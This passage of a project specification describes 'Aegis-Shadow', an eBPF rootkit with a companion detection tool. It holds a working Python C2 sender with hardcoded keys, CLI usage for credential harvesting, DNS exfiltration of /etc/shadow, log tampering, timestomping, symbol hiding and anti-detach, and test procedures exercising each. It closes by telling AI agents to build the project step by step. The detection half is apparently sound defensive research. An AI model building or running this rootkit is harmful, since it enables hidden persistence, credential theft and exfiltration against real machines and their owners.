	cargo install bpf-linker
	cargo install cargo-generate
	sudo apt install -y bpftool libelf-dev clang llvm
```

---

## 8.5 C2 Sender Tool (`tools/c2_sender.py`)

A Python script to craft and send C2 command packets to the XDP listener.
Supports both legacy (HMAC-only) and encrypted (ChaCha8) modes.

```python
#!/usr/bin/env python3
"""
Aegis-Shadow C2 Command Sender

Sends authenticated C2 command packets to the Shadow XDP listener.
Supports two modes:
  - legacy:    MAGIC(4) + CommandPayload(16) + HMAC(16) = 36 bytes
  - encrypted: MAGIC(4) + Nonce(12) + EncPayload(16) + MAC(16) = 48 bytes

Usage:
    python3 c2_sender.py --target 127.0.0.1 --cmd hide_pid --arg 1234
    python3 c2_sender.py --target 10.0.0.1 --cmd unhide_pid --arg 1234 --mode encrypted
"""

import argparse
import hashlib
import hmac
import os
import socket
import struct

# Must match the constants in offense-ebpf
MAGIC_BYTES = b"\xDE\xAD\xBE\xEF"
C2_PORT = 53
# 32-byte HMAC key — MUST match C2_HMAC_KEY in offense-ebpf/src/main.rs
C2_HMAC_KEY = bytes([
    0x4a, 0x7b, 0x2c, 0x1d, 0x3e, 0x5f, 0x60, 0x71,
    0x82, 0x93, 0xa4, 0xb5, 0xc6, 0xd7, 0xe8, 0xf9,
    0x01, 0x12, 0x23, 0x34, 0x45, 0x56, 0x67, 0x78,
    0x89, 0x9a, 0xab, 0xbc, 0xcd, 0xde, 0xef, 0xf0,
])
# 32-byte ChaCha8 key — MUST match C2_CHACHA20_KEY in offense-ebpf/src/main.rs
C2_CHACHA_KEY = bytes([
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
])

CMD_TYPES = {
    "hide_pid": 1,
    "unhide_pid": 2,
    "obfuscate_file": 3,
    "exfil": 4,
    "kill_switch": 5,
}


def compute_hmac(data: bytes) -> bytes:
    """
    Compute the C2 HMAC matching the eBPF implementation.

    The eBPF side uses a custom XOR-fold HMAC (not standard HMAC-SHA256)
    due to eBPF constraints. This Python implementation mirrors that logic:

    1. XOR each 4-byte chunk of data with the HMAC key (cycling)
    2. Mix with rotation and addition
    3. Fold the 32-byte result down to 16 bytes via XOR

    This is NOT cryptographically strong — it's a research-grade MAC.
    """
    # Initialize state from key
    state = list(C2_HMAC_KEY)

    # Mix data into state
    for i, byte in enumerate(data):
        key_idx = i % 32
        state[key_idx] ^= byte
        # Rotate and mix
        next_idx = (key_idx + 1) % 32
        state[next_idx] = (state[next_idx] + state[key_idx]) & 0xFF

    # Fold 32 bytes down to 16
    result = bytearray(16)
    for i in range(16):
        result[i] = state[i] ^ state[i + 16]

    return bytes(result)


def chacha8_quarter_round(state, a, b, c, d):
    """ChaCha quarter-round operation."""
    state[a] = (state[a] + state[b]) & 0xFFFFFFFF
    state[d] ^= state[a]
    state[d] = ((state[d] << 16) | (state[d] >> 16)) & 0xFFFFFFFF

    state[c] = (state[c] + state[d]) & 0xFFFFFFFF
    state[b] ^= state[c]
    state[b] = ((state[b] << 12) | (state[b] >> 20)) & 0xFFFFFFFF

    state[a] = (state[a] + state[b]) & 0xFFFFFFFF
    state[d] ^= state[a]
    state[d] = ((state[d] << 8) | (state[d] >> 24)) & 0xFFFFFFFF

    state[c] = (state[c] + state[d]) & 0xFFFFFFFF
    state[b] ^= state[c]
    state[b] = ((state[b] << 7) | (state[b] >> 25)) & 0xFFFFFFFF


def chacha8_block(key: bytes, nonce: bytes, counter: int) -> bytes:
    """Generate a ChaCha8 keystream block (8 rounds)."""
    # Initialize state
    state = [
        0x61707865, 0x3320646E, 0x79622D32, 0x6B206574,  # constants
    ]
    # Key words (little-endian)
    for i in range(8):
        state.append(int.from_bytes(key[i*4:(i+1)*4], 'little'))
    # Counter
    state.append(counter & 0xFFFFFFFF)
    # Nonce words (little-endian)
    for i in range(3):
        state.append(int.from_bytes(nonce[i*4:(i+1)*4], 'little'))

    initial = list(state)

    # 4 double-rounds (= 8 rounds)
    for _ in range(4):
        chacha8_quarter_round(state, 0, 4, 8, 12)
        chacha8_quarter_round(state, 1, 5, 9, 13)
        chacha8_quarter_round(state, 2, 6, 10, 14)
        chacha8_quarter_round(state, 3, 7, 11, 15)
        chacha8_quarter_round(state, 0, 5, 10, 15)
        chacha8_quarter_round(state, 1, 6, 11, 12)
        chacha8_quarter_round(state, 2, 7, 8, 13)
        chacha8_quarter_round(state, 3, 4, 9, 14)

    # Add initial state
    for i in range(16):
        state[i] = (state[i] + initial[i]) & 0xFFFFFFFF

    # Serialize to bytes
    output = b""
    for word in state:
        output += word.to_bytes(4, 'little')
    return output


def build_legacy_packet(cmd_type: int, arg1: int) -> bytes:
    """Build a legacy (HMAC-only) C2 packet."""
    # CommandPayload: cmd_type(u32) + arg1(u32) + _reserved(u64) = 16 bytes
    payload = struct.pack("<IIQ", cmd_type, arg1, 0)
    # Data to HMAC: MAGIC + payload
    hmac_data = MAGIC_BYTES + payload
    mac = compute_hmac(hmac_data)
    return MAGIC_BYTES + payload + mac


def build_encrypted_packet(cmd_type: int, arg1: int) -> bytes:
    """Build an encrypted (ChaCha8) C2 packet."""
    # Generate random nonce
    nonce = os.urandom(12)

    # CommandPayload
    payload = struct.pack("<IIQ", cmd_type, arg1, 0)

    # Encrypt: XOR with ChaCha8 keystream
    keystream = chacha8_block(C2_CHACHA_KEY, nonce, 0)
    encrypted = bytes(p ^ k for p, k in zip(payload, keystream[:16]))

    # MAC covers: MAGIC + nonce + encrypted_payload
    mac_data = MAGIC_BYTES + nonce + encrypted
    mac = compute_hmac(mac_data)

    return MAGIC_BYTES + nonce + encrypted + mac


def send_c2(target: str, cmd_name: str, arg: int, mode: str = "legacy", port: int = C2_PORT):
    """Send a C2 command packet."""
    cmd_type = CMD_TYPES.get(cmd_name)
    if cmd_type is None:
        print(f"Unknown command: {cmd_name}")
        print(f"Available: {', '.join(CMD_TYPES.keys())}")
        return

    if mode == "encrypted":
        packet = build_encrypted_packet(cmd_type, arg)
        print(f"[*] Sending encrypted C2: {cmd_name}(arg={arg}) -> {target}:{port}")
        print(f"    Packet size: {len(packet)} bytes (MAGIC+NONCE+ENC+MAC)")
    else:
        packet = build_legacy_packet(cmd_type, arg)
        print(f"[*] Sending legacy C2: {cmd_name}(arg={arg}) -> {target}:{port}")
        print(f"    Packet size: {len(packet)} bytes (MAGIC+PAYLOAD+HMAC)")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet, (target, port))
    sock.close()
    print(f"[+] Sent successfully.")


def main():
    parser = argparse.ArgumentParser(description="Aegis-Shadow C2 Command Sender")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--cmd", required=True, choices=list(CMD_TYPES.keys()),
                        help="Command to send")
    parser.add_argument("--arg", type=int, default=0, help="Command argument (e.g., PID)")
    parser.add_argument("--mode", choices=["legacy", "encrypted"], default="legacy",
                        help="C2 mode: legacy (HMAC) or encrypted (ChaCha8)")
    parser.add_argument("--port", type=int, default=C2_PORT,
                        help=f"Target UDP port (default: {C2_PORT})")

    args = parser.parse_args()
    send_c2(args.target, args.cmd, args.arg, args.mode, args.port)


if __name__ == "__main__":
    main()
```

---

## 9. CLI Design

### 9.1 Offense CLI (`shadow`)

```
shadow — Aegis-Shadow eBPF Rootkit Research Tool

USAGE:
    shadow [OPTIONS] <COMMAND>

OPTIONS:
    --dry-run        Log all operations without loading eBPF programs

COMMANDS:
    hide-pid         Hide a process by PID
    net-stealth      Enable network stealth on an interface
    cred-harvest     Harvest credentials from TTY writes
    spoof-ancestry   Spoof process parent PID
    dns-exfil        Exfiltrate data via DNS tunneling
    timestomp        Fake file timestamps
    obfuscate-file   Hide a specific file from readdir/stat
    hide-kallsyms    Hide rootkit symbols from /proc/kallsyms
    mute-telemetry   Suppress audit telemetry for hidden PIDs
    tamper-logs      Tamper kernel log messages to hide traces
    full             Run full rootkit with all features
    cleanup          Remove all pinned BPF programs
    kill-switch      Emergency: detach ALL Shadow eBPF programs immediately

EXAMPLES:
    sudo ./shadow hide-pid --pid 1234
    sudo ./shadow --dry-run hide-pid --pid 1234  # Safe: no eBPF loaded
    sudo ./shadow net-stealth --iface eth0
    sudo ./shadow cred-harvest --pid 1234
    sudo ./shadow spoof-ancestry --pid 1234 --fake-ppid 1
    sudo ./shadow dns-exfil --iface eth0 --file /etc/shadow
    sudo ./shadow timestomp --path /tmp/payload --mtime 1609459200
    sudo ./shadow obfuscate-file --path /tmp/payload
    sudo ./shadow hide-kallsyms
    sudo ./shadow mute-telemetry
    sudo ./shadow tamper-logs
    sudo ./shadow full --pid 1234 --iface eth0 --persist --cred-harvest --anti-detach
    sudo ./shadow cleanup
    sudo ./shadow kill-switch  # Emergency teardown
```

### 9.2 Defense CLI (`aegis`)

```
aegis — Aegis-Shadow eBPF Runtime Security Shield

USAGE:
    aegis [OPTIONS] <COMMAND>

OPTIONS:
    --json              Output results as JSON lines (SIEM/CI integration)
    --threshold <FLOAT> Latency threshold multiplier (default: 1.3 = 30% above baseline)

COMMANDS:
    audit             Run full audit (ghost maps + integrity + hooks + hidden procs + net + latency)
    baseline          Calibrate latency baseline across 5 monitored syscalls
    monitor           Monitor multi-syscall latency in real-time
    ghost-maps        Scan for ghost BPF maps with metadata heuristics
    integrity-check   Check bytecode integrity for dangerous BPF helpers
    hook-audit        Audit BPF programs attached to sensitive kernel functions
    hidden-procs      Scan for processes hidden from /proc enumeration
    net-audit         Scan for rogue XDP/TC attachments on network interfaces
    quarantine <IDs>  Detach and unpin suspicious BPF programs by ID

EXAMPLES:
    sudo ./aegis audit
    sudo ./aegis audit --json
    sudo ./aegis baseline --threshold 1.5
    sudo ./aegis monitor --json
    sudo ./aegis ghost-maps
    sudo ./aegis integrity-check
    sudo ./aegis hook-audit
    sudo ./aegis hidden-procs
    sudo ./aegis net-audit
    sudo ./aegis quarantine 42 57
```

---

## 10. Testing & Verification Plan

### 10.1 Phase 1: Environment Verification

```bash
# Run from project root
bash verify-env.sh
# ALL checks must show "OK" or valid version numbers.
# If any check fails, fix the environment before proceeding.
```

### 10.2 Phase 2: Build Verification

```bash
# Build eBPF programs
cargo xtask build-ebpf --release
# Expected: "eBPF build complete." with no errors.

# Build user-space
cargo build --release --package offense --package defense
# Expected: Clean build with no errors.

# Verify binaries exist
ls -la target/release/offense target/release/defense
# Expected: Both binaries present, executable.
```

### 10.3 Phase 3: Feature 1 Test (Process Hiding)

```bash
# Terminal 1: Create a target process
sleep 99999 &
TARGET_PID=$!
echo "Target PID: $TARGET_PID"

# Verify process is visible
ps aux | grep "$TARGET_PID"
# Expected: sleep process visible in output

# Terminal 2: Load the rootkit
sudo ./target/release/offense hide-pid --pid $TARGET_PID
# Expected: "Shadow active. PID XXXX is now hidden."

# Terminal 1: Verify process is hidden
ps aux | grep "$TARGET_PID"
# Expected: NO output (process hidden from ps)

# But the process is still running:
kill -0 $TARGET_PID && echo "Still alive" || echo "Dead"
# Expected: "Still alive"

# Ctrl+C in Terminal 2 to stop the rootkit
# Then verify process is visible again:
ps aux | grep "$TARGET_PID"
# Expected: sleep process visible again
```

### 10.4 Phase 4: Feature 2 Test (Network Stealth)

```bash
# Terminal 1: Load network stealth
sudo ./target/release/offense net-stealth --iface eth0
# Expected: "Shadow active. XDP attached to eth0."

# Terminal 2: Send a C2 packet (from another machine or loopback)
# Use Python or netcat to send a UDP packet with magic bytes:
python3 -c "
import socket
payload = b'\xDE\xAD\xBE\xEF' + b'\x01\x00\x00\x00' + b'\x00\x00\x00\x00' * 2
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(payload, ('VM_IP', 53))
"
# Expected: Terminal 1 shows "C2 command received: cmd_type=1"
# Expected: tcpdump on the VM shows NO incoming packet (XDP dropped it)
```

### 10.5 Phase 5: Defense Audit Test

```bash
# === Phase 5a: Ghost Maps + Integrity + Hook Audit ===
# With the rootkit running (from Phase 3):

# Terminal 3: Run defense ghost map scan
sudo ./target/release/defense ghost-maps
# Expected: Detects ghost maps (if rootkit uses pinned maps) and suspicious names/types

# Terminal 3: Run integrity check
sudo ./target/release/defense integrity-check
# Expected: "[!] SUSPICIOUS PROGRAM: ... uses bpf_probe_write_user [critical]"

# Terminal 3: Run hook audit
sudo ./target/release/defense hook-audit
# Expected: "[!] UNAUTHORIZED HOOK: Program ... attached to sensitive function 'sys_getdents64'"
# Expected: Also flags hooks on vfs_read, vfs_getattr, do_syslog, ksys_write

# === Phase 5b: Hidden Process Detection ===
# (Requires rootkit running with hide-pid)
sudo ./target/release/defense hidden-procs
# Expected: "[!] ALERT: Found 1 hidden process(es): [TARGET_PID]"

# === Phase 5c: Network Audit ===
# (Requires rootkit running with net-stealth)
sudo ./target/release/defense net-audit
# Expected: "[!] XDP program ... attached to iface 'eth0'"
# Expected: "[!] TC egress program ... on iface 'eth0' — possible DNS exfil"

# === Phase 5d: Baseline Calibration ===
# First stop the rootkit, then calibrate baseline without interference
sudo ./target/release/defense baseline
# Expected: Per-syscall baselines:
#   getdents64: mean=XXXns (YY samples)
#   vfs_read: mean=XXXns (YY samples)
#   ksys_write: mean=XXXns (YY samples)
#   vfs_getattr: mean=XXXns (YY samples)
#   do_syslog: mean=XXXns (YY samples)

# === Phase 5e: Latency Monitoring ===
# Start rootkit again, then run monitor
sudo ./target/release/defense monitor
# Trigger getdents64 by running `ls /proc` in another terminal
# Expected: "[!] LATENCY ANOMALY [getdents64]: measured=XXXns, baseline=XXXns (+XX.X%)"
# Expected: Rate-limited to 1 alert per 100ms per syscall per CPU

# === Phase 5f: Full Audit with JSON ===
sudo ./target/release/defense audit --json
# Expected: Structured JSON report with all findings:
# { "findings": [...], "critical_count": N, "warning_count": N, ... }

# === Phase 5g: Quarantine ===
# Get suspicious program IDs from audit output
sudo ./target/release/defense quarantine 42 57
# Expected: "Quarantining BPF program id=42..." + "Detached program id=42"
# Expected: Rootkit hooks removed, hidden processes become visible again
```

### 10.6 Phase 6: Persistence Test

```bash
# Load rootkit with persistence
sudo ./target/release/offense full --pid $TARGET_PID --iface eth0 --persist
# Expected: "Programs pinned to /sys/fs/bpf/shadow"

# Kill the loader process
sudo pkill -f "offense"

# Verify hooks are still active (process still hidden)
ps aux | grep "$TARGET_PID"
# Expected: NO output — the eBPF programs survive because they're pinned

# Run defense audit
sudo ./target/release/defense audit
# Expected: "[!] Persistent BPF Program found pinned at /sys/fs/bpf/shadow"

# Cleanup
sudo ./target/release/offense cleanup
# Expected: "Removed all pinned programs from /sys/fs/bpf/shadow"
```

### 10.7 Phase 7: Kill-Switch Test

```bash
# Load rootkit with persistence
sudo ./target/release/offense full --pid $TARGET_PID --iface eth0 --persist

# Simulate crash: kill the loader
sudo kill -9 $(pgrep -f "offense")

# Verify hooks are still active (pinned programs survive)
ps aux | grep "$TARGET_PID"
# Expected: NO output

# Emergency kill-switch (works even though loader is dead)
sudo ./target/release/offense kill-switch
# Expected: "KILL SWITCH ACTIVATED" + removal of all programs and maps

# Verify process is visible again
ps aux | grep "$TARGET_PID"
# Expected: sleep process visible
```

### 10.8 Phase 8: Dry-Run Test

```bash
# Dry-run should NOT load any eBPF programs
sudo ./target/release/offense --dry-run hide-pid --pid 1234
# Expected: "[DRY RUN] Would hide PID 1234" — no eBPF loaded

# Verify no Shadow programs are loaded
sudo bpftool prog list | grep shadow
# Expected: no output
```

### 10.9 Phase 9: Feature 6 Test (Credential Harvesting)

```bash
# Terminal 1: Start credential harvester monitoring all TTYs
sudo ./target/release/offense cred-harvest --pid 0

# Terminal 2: Open a new TTY and type simulated credentials
echo "password123" | sudo tee /dev/pts/0 > /dev/null
# Or manually: sudo su - testuser (and type a password)

# Expected in Terminal 1:
# "[CRED] PID XXXX fd=Y: password123"

# Cleanup: Ctrl+C in Terminal 1
```

### 10.10 Phase 10: Feature 7 Test (Log Tampering)

```bash
# Terminal 1: Start log tampering
sudo ./target/release/offense tamper-logs

# Terminal 2: Generate a kernel log message containing "shadow"
echo "shadow_test_marker" | sudo tee /dev/kmsg
# Read kernel log
dmesg | grep shadow_test_marker
# Expected: Either no output or "shadow_test_marker" with PID field zeroed

# Cleanup: Ctrl+C in Terminal 1
```

### 10.11 Phase 11: Feature 8 Test (Process Ancestry Spoofing)

```bash
# Start a long-running process
sleep 3600 &
SLEEP_PID=$!
echo "Real PPID of sleep: $(grep PPid /proc/$SLEEP_PID/status)"

# Spoof its parent to PID 1 (init)
sudo ./target/release/offense spoof-ancestry --pid $SLEEP_PID --fake-ppid 1

# In another terminal:
grep PPid /proc/$SLEEP_PID/status
# Expected: "PPid:	1" (spoofed)

pstree -p | grep $SLEEP_PID
# Expected: sleep appears as child of init/systemd

# Cleanup: Ctrl+C, kill $SLEEP_PID
```

### 10.12 Phase 12: Feature 9 Test (DNS Exfiltration)

```bash
# Create a test file with known content
echo "EXFIL_TEST_DATA_12345" > /tmp/exfil_test.txt

# Terminal 1: Start DNS exfil
sudo ./target/release/offense dns-exfil --iface eth0 --file /tmp/exfil_test.txt

# Terminal 2: Capture DNS traffic on loopback or external
sudo tcpdump -i eth0 -n port 53 -X &

# Terminal 3: Generate DNS queries to trigger exfil
for i in $(seq 1 5); do dig example.com; done

# Expected in Terminal 1:
# "Chunk 0 sent (1/1)" (file is small, fits in 1 chunk)

# Expected in Terminal 2 (tcpdump):
# DNS query with hex-encoded data as subdomain label

# Cleanup: Ctrl+C, rm /tmp/exfil_test.txt
```

### 10.13 Phase 13: Feature 10 Test (Kallsyms Hiding)

```bash
# Before: Verify shadow symbols are visible (if rootkit is loaded)
cat /proc/kallsyms | grep shadow | head -5
# Expected: Lines like "ffffffffXXXX t shadow_getdents_enter"

# Start kallsyms hiding
sudo ./target/release/offense hide-kallsyms

# After: Check again
cat /proc/kallsyms | grep shadow
# Expected: No output (symbols hidden)

# Also verify legitimate symbols are NOT affected
cat /proc/kallsyms | grep do_sys_open | head -1
# Expected: Normal output (unaffected)

# Cleanup: Ctrl+C
```

### 10.14 Phase 14: Feature 11 Test (Anti-Detach Self-Defense)

```bash
# Terminal 1: Start rootkit in full mode with anti-detach
sudo ./target/release/offense full --pid $$ --iface lo --anti-detach

# Terminal 2: Try to detach a BPF program
PROG_ID=$(sudo bpftool prog list | grep shadow_getdents | awk '{print $1}' | tr -d ':')
sudo bpftool prog detach id $PROG_ID

# Expected in Terminal 1:
# "ANTI-DETACH alert: PID XXXX cmd=9"  (BPF_PROG_DETACH=9)
# "Re-attaching detached programs..."

# Verify the program is still running:
sudo bpftool prog list | grep shadow_getdents
# Expected: Program still listed (re-attached)

# Cleanup: Ctrl+C in Terminal 1, then kill-switch
```

### 10.15 Phase 15: Feature 12 Test (Encrypted C2)

```bash
# Terminal 1: Start network stealth (XDP with ChaCha8 support)
sudo ./target/release/offense net-stealth --iface lo

# Terminal 2: Send an encrypted C2 command using the sender tool
python3 tools/c2_sender.py --target 127.0.0.1 --cmd hide_pid --arg 1234 --mode encrypted

# Expected in Terminal 1:
# "C2 command received: type=1, arg=1234"

# Verify PID 1234 is hidden (if it exists)
ps aux | grep 1234

# Also test legacy mode (backwards compatibility)
python3 tools/c2_sender.py --target 127.0.0.1 --cmd hide_pid --arg 5678 --mode legacy

# Expected in Terminal 1:
# "C2 command received: type=1, arg=5678"

# Cleanup: Ctrl+C in Terminal 1
```

### 10.16 Phase 16: Feature 13 Test (Timestomping)

```bash
# Create a test file
echo "test" > /tmp/timestomp_test.txt
stat /tmp/timestomp_test.txt
# Note the current Modify time

# Start timestomping with a backdated time (Jan 1 2020 = 1577836800)
sudo ./target/release/offense timestomp --path /tmp/timestomp_test.txt --mtime 1577836800

# Check the timestamps
stat /tmp/timestomp_test.txt
# Expected: Modify time shows 2020-01-01

ls -la /tmp/timestomp_test.txt
# Expected: Date shows Jan 1 2020

# Cleanup: Ctrl+C, rm /tmp/timestomp_test.txt
```

### 10.17 Automated Integration Tests

> These tests require root privileges and a Linux kernel with eBPF support.
> Run with: `sudo cargo test --package offense --package defense -- --test-threads=1`

Add the following test modules to the respective crates.

#### offense/tests/integration.rs

```rust
//! Integration tests for the offense module.
//! These tests require root and a Linux 6.8+ kernel.
//! Run with: sudo cargo test --package offense -- --test-threads=1

#[cfg(test)]
mod tests {
    use std::process::Command;

    /// Helper: check if running as root
    fn is_root() -> bool {
        unsafe { libc::geteuid() == 0 }
    }

    /// Helper: check if bpftool is available
    fn has_bpftool() -> bool {
        Command::new("bpftool").arg("version").output().is_ok()
    }

    #[test]
    fn test_privilege_check_fails_without_root() {
        if is_root() {
            eprintln!("Skipping: test must run as non-root");
            return;
        }
        let output = Command::new(env!("CARGO_BIN_EXE_offense"))
            .args(["hide-pid", "--pid", "1"])
            .output()
            .expect("Failed to run offense binary");
        assert!(!output.status.success(), "Should fail without root");
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(
            stderr.contains("Insufficient privileges") || stderr.contains("Permission denied"),
            "Should report privilege error"
        );
    }

    #[test]
    fn test_dry_run_does_not_load_ebpf() {
        let output = Command::new(env!("CARGO_BIN_EXE_offense"))
            .args(["--dry-run", "hide-pid", "--pid", "9999"])
            .output()
            .expect("Failed to run offense binary");
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(
            !stderr.contains("Attached kprobe"),
            "Dry run must not attach eBPF programs"
        );
    }

    #[test]
    fn test_cleanup_on_empty_state() {
        let output = Command::new(env!("CARGO_BIN_EXE_offense"))
            .args(["cleanup"])
            .output()
            .expect("Failed to run offense binary");
        assert!(output.status.success(), "Cleanup should always succeed");
    }

    #[test]
    fn test_kill_switch_on_empty_state() {
        if !is_root() || !has_bpftool() {
            eprintln!("Skipping: requires root + bpftool");
            return;
        }
        let output = Command::new(env!("CARGO_BIN_EXE_offense"))
            .args(["kill-switch"])
            .output()
            .expect("Failed to run offense binary");
        assert!(output.status.success(), "Kill-switch should succeed even with no programs loaded");
    }
}
```

#### defense/tests/integration.rs

```rust
//! Integration tests for the defense module.
//! Run with: sudo cargo test --package defense -- --test-threads=1
//!
//! Tests are split into:
//!   - Negative path: error handling, privilege checks
//!   - Positive path: actual detection capabilities (require root + bpftool)
//!   - JSON output: structured output validation

#[cfg(test)]
mod tests {
    use std::process::Command;

    fn is_root() -> bool {
        unsafe { libc::geteuid() == 0 }
    }

    fn has_bpftool() -> bool {
        Command::new("bpftool").arg("version").output()
            .map(|o| o.status.success())
            .unwrap_or(false)
    }

    fn defense_bin() -> String {
        env!("CARGO_BIN_EXE_defense").to_string()
    }

    // ─── Negative Path Tests ──────────────────────

    #[test]
    fn test_privilege_error_for_monitor() {
        if is_root() {
            eprintln!("Skipping: must run as non-root");
            return;
        }
        let output = Command::new(defense_bin())
            .args(["monitor"])
            .output()
            .expect("Failed to run defense binary");
        assert!(!output.status.success());
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(
            stderr.contains("Insufficient privileges"),
            "Should report privilege error: {}",
            stderr
        );
    }

    #[test]
    fn test_privilege_error_for_baseline() {
        if is_root() {
            eprintln!("Skipping: must run as non-root");
            return;
        }
        let output = Command::new(defense_bin())
            .args(["baseline"])
            .output()
            .expect("Failed to run defense binary");
        assert!(!output.status.success());
    }

    // ─── Smoke Tests (require bpftool) ────────────

    #[test]
    fn test_ghost_maps_no_panic() {
        if !has_bpftool() {
            eprintln!("Skipping: bpftool not available");
            return;
        }
        let output = Command::new(defense_bin())
            .args(["ghost-maps"])
            .output()
            .expect("Failed to run defense binary");
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(!stderr.contains("panic"), "Should not panic: {}", stderr);
    }

    #[test]
    fn test_integrity_check_no_panic() {
        if !has_bpftool() {
            eprintln!("Skipping: bpftool not available");
            return;
        }
        let output = Command::new(defense_bin())
            .args(["integrity-check"])
            .output()
            .expect("Failed to run defense binary");
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(!stderr.contains("panic"), "Should not panic: {}", stderr);
    }

    #[test]
    fn test_hook_audit_no_panic() {
        if !has_bpftool() {
            eprintln!("Skipping: bpftool not available");
            return;
        }
        let output = Command::new(defense_bin())
            .args(["hook-audit"])
            .output()
            .expect("Failed to run defense binary");
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(!stderr.contains("panic"), "Should not panic: {}", stderr);
    }

    #[test]
    fn test_hidden_procs_no_panic() {
        // hidden-procs does not require bpftool or root (uses kill(2))
        let output = Command::new(defense_bin())
            .args(["hidden-procs"])
            .output()
            .expect("Failed to run defense binary");
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(!stderr.contains("panic"), "Should not panic: {}", stderr);
    }

    #[test]
    fn test_net_audit_no_panic() {
        if !has_bpftool() {
            eprintln!("Skipping: bpftool not available");
            return;
        }
        let output = Command::new(defense_bin())
            .args(["net-audit"])
            .output()
            .expect("Failed to run defense binary");
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(!stderr.contains("panic"), "Should not panic: {}", stderr);
    }

    // ─── JSON Output Tests ────────────────────────

    #[test]
    fn test_ghost_maps_json_output() {
        if !has_bpftool() {
            eprintln!("Skipping: bpftool not available");
            return;
        }
        let output = Command::new(defense_bin())
            .args(["--json", "ghost-maps"])
            .output()
            .expect("Failed to run defense binary");
        let stdout = String::from_utf8_lossy(&output.stdout);
        // JSON output should be valid JSON (array)
        if !stdout.trim().is_empty() {
            let parsed: Result<serde_json::Value, _> = serde_json::from_str(stdout.trim());
            assert!(parsed.is_ok(), "JSON output should be valid: {}", stdout);
        }
    }

    #[test]
    fn test_audit_json_output() {
        if !is_root() || !has_bpftool() {
            eprintln!("Skipping: requires root + bpftool");
            return;
        }
        let output = Command::new(defense_bin())
            .args(["--json", "audit"])
            .output()
            .expect("Failed to run defense binary");
        let stdout = String::from_utf8_lossy(&output.stdout);
        if !stdout.trim().is_empty() {
            let parsed: Result<serde_json::Value, _> = serde_json::from_str(stdout.trim());
            assert!(parsed.is_ok(), "Audit JSON should be valid: {}", stdout);
        }
    }

    // ─── Positive Detection Tests (require root + rootkit loaded) ───

    #[test]
    fn test_integrity_check_detects_dangerous_helpers() {
        // This test only passes when a program with bpf_probe_write_user is loaded.
        // Load offense first, then run this test.
        if !is_root() || !has_bpftool() {
            eprintln!("Skipping: requires root + bpftool + rootkit loaded");
            return;
        }
        let output = Command::new(defense_bin())
            .args(["integrity-check"])
            .output()
            .expect("Failed to run defense binary");
        let stderr = String::from_utf8_lossy(&output.stderr);
        // If rootkit is loaded, we should see findings
        if stderr.contains("bpf_probe_write_user") {
            assert!(
                !output.status.success() || output.status.code() == Some(2),
                "Should exit with code 2 when dangerous helpers found"
            );
        }
    }

    #[test]
    fn test_hidden_procs_detects_hidden_pid() {
        // This test only works when the rootkit is hiding a process.
        // The test creates a sleep process, loads the rootkit, then checks.
        if !is_root() {
            eprintln!("Skipping: requires root + rootkit loaded with hide-pid");
            return;
        }
        // When rootkit is hiding PIDs, hidden-procs should find them
        let output = Command::new(defense_bin())
            .args(["hidden-procs"])
            .output()
            .expect("Failed to run defense binary");
        let stderr = String::from_utf8_lossy(&output.stderr);
        // Just verify it runs without panic; actual detection depends on rootkit state
        assert!(!stderr.contains("panic"), "Should not panic: {}", stderr);
    }

    // ─── Exit Code Tests ──────────────────────────

    #[test]
    fn test_audit_exit_code_clean_system() {
        // On a clean system (no rootkit), audit should exit 0
        if !is_root() || !has_bpftool() {
            eprintln!("Skipping: requires root + bpftool");
            return;
        }
        let output = Command::new(defense_bin())
            .args(["audit"])
            .output()
            .expect("Failed to run defense binary");
        // Can't assert exit code 0 because system may have legitimate BPF programs
        // Just assert it doesn't panic
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(!stderr.contains("panic"), "Should not panic: {}", stderr);
    }
}
```

---

## 11. Dependency Manifest

### 11.1 System Dependencies (apt)

| Package | Purpose |
|---|---|
| `build-essential` | C compiler and build tools |
| `pkg-config` | Library discovery |
| `libelf-dev` | ELF parsing (required by bpf-linker) |
| `clang` | LLVM C compiler (BPF backend) |
| `llvm` | LLVM tools |
| `linux-tools-$(uname -r)` | bpftool and perf |
| `bpftool` | BPF program/map inspection |

### 11.2 Cargo Dependencies

| Crate | Version | Used In | Purpose |
|---|---|---|---|
| `aya` | `~0.13` | offense, defense | User-space eBPF library |
| `aya-ebpf` | `~0.1` | offense-ebpf, defense-ebpf | Kernel-space eBPF macros |
| `aya-log` | `~0.2` | offense, defense | User-space log receiver |
| `aya-log-ebpf` | `~0.1` | offense-ebpf, defense-ebpf | Kernel-space logging |
| `tokio` | `1` | offense, defense | Async runtime |
| `clap` | `4` | offense, defense, xtask | CLI argument parsing |
| `anyhow` | `1` | all user-space | Error handling |
| `env_logger` | `0.11` | offense, defense | Log output |
| `log` | `0.4` | offense, defense | Logging facade |
| `libc` | `0.2` | offense, defense | Privilege checks (`geteuid`) |
| `procfs` | `0.16` | defense | `/proc` filesystem parsing |
| `serde` | `1` | defense, offense | JSON serialization |
| `serde_json` | `1` | defense, offense | JSON parsing (bpftool output) |
| `bytes` | `1` | offense | Byte buffer handling |
| `nix` | `0.29` | offense | TTY device resolution for credential harvesting |

### 11.3 Rust Toolchain

| Component | Version |
|---|---|
| Rust | nightly (latest) |
| Target | `bpfel-unknown-none` (eBPF little-endian) |
| `bpf-linker` | latest via `cargo install` |
| `cargo-generate` | latest via `cargo install` |

---

## 12. Implementation Order for AI Agents

> **CRITICAL**: Follow this order exactly. Each step depends on the previous ones unless marked as parallelizable.

### Step 1: Project Scaffolding
**Create all directories and Cargo.toml files.**
- [ ] Create `aegis-shadow/` directory
